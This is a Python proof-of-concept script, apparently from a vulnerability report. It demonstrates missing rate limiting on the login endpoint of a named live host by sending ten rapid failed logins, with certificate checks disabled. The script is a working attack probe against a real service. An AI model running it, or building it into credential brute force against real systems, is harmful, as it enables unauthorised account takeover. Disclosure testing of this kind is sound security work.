#!/usr/bin/env python3
"""
POC-S01: No Rate Limiting on /auth/login — silentnet.st
=========================================================
Target:  https://silentnet.st
Vuln:    POST /auth/login accepts {userId, accountKey} with no rate limiting,
         no CSRF requirement, no lockout after repeated failures, and no
         progressive delay. Endpoint is openly accessible (no IP allowlist).
Impact:  Unauthenticated brute force of operator accounts.
Author:  Security Research — 2026-07-20
"""
import urllib.request, urllib.error, ssl, json, time, sys

TARGET = "silentnet.st"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

def login(user_id, account_key):
    data = json.dumps({"userId": user_id, "accountKey": account_key}).encode()
    req = urllib.request.Request(
        f"https://{TARGET}/auth/login",
        data=data, method="POST",
        headers={"Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0"}
    )
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=10, context=ctx)
        return r.status, json.loads(r.read()), time.time()-t0
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read()), time.time()-t0

print("=== NO RATE LIMIT DEMONSTRATION ===")
print("Sending 10 rapid login attempts with random credentials")
print()
for i in range(10):
    code, resp, elapsed = login(f"testuser_{i}", f"wrongkey_{i}")
    status = "RATE LIMITED" if code == 429 else ("SUCCESS" if resp.get("success") else "REJECTED")
    print(f"  [{i+1:2d}] HTTP {code} {elapsed:.2f}s [{status}]: {resp}")

print()
print("[+] If all responses are 401 with no 429 — rate limiting is absent")
print("[+] No X-RateLimit headers observed")
print("[+] No lockout after repeated failures")
